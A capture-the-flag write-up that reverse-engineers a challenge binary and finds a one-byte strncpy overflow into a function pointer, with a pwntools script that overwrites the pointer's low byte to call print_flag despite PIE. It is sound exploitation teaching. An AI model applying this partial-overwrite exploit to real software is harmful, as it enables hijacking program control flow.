# Pwn2  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1c084821-f27e-4118-87c1-0f1452e578f9)  
It says that the objective of this challenge is to read the flag, not to pop a shell.  

Let's see what happens when you run the program:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/93f1e762-26e7-4248-a73a-4ec28894ff6f)  
It doesn't seem to do anything, but lets take a peek inside to see what the binary is really doing.  


```
undefined4 main(void)

{
  char input [31];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  puts("Which function would you like to call?");
  gets(input);
  select_func(input);
  return 0;
}

void select_func(char *input)

{
  int iVar1;
  char local_2e [30];
  code *func_ptr;
  
  func_ptr = two;
  strncpy(local_2e,input,31);
  iVar1 = strcmp(local_2e,"one");
  if (iVar1 == 0) {
    func_ptr = one;
  }
  (*func_ptr)();
  return;
}
```
`one` and `two` are functions that just print some text. There is also a `print_flag` function, that prints the flag, but it is not called anywhere.   
Looking at the `select_func` function it seems that we should have called `two`, but we didn't. What happened?  
First notice that our buffer is 30 bytes long, but `strncmp` is reading 31 bytes. Looking into the `strncpy` man pages we see:  
" If the length of src is less than n, strncpy() writes additional null bytes to dest to ensure that a total of n bytes are written "  
That means that even though our input was not long enough, we still had a single byte overflow.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/a156c274-0c2e-4608-b653-90f0beecb346)  
The stack layout in Ghidra indicated that the byte is overflowing into the function pointer. So that's why `two` was not getting called.  

Now that we know what is going on, we can abuse this byte overflow to call another function that we are interested in. Note that, even though PIE is enabled, due to the way PIE and ASLR work, only the base addresses are randomized.
This means some of the lower bytes are not random. Therefore we can overwrite the last byte of the function pointer with something else, and not worry about PIE.  

Our function of interest is `print_flag`.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/484e8cf8-af44-4de3-9f7c-67ca44c60d94)  
Notice that in this case only the last byte differs! Almost like this is by design...  

Now everything is ready for us to write an exploit.  
```python
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pwn2')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

payload = 30*b'A' + (exe.sym['print_flag'] & 0xff).to_bytes(1,'little')
io.sendline(payload)

io.interactive()
```
ez <|:^)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9ecebc6a-171f-4f01-9746-7452773dc0ae)






